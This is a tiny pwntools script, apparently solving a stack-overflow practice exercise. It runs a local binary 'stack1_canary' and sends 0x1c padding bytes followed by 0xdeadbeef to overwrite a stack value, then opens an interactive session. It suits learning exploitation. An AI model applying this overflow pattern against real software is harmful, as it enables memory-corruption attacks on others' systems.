from pwn import *


#io = process("./stack1")
io = process("./stack1_canary")
io.send(b'a'*0x1c + p32(0xdeadbeef))

io.interactive()
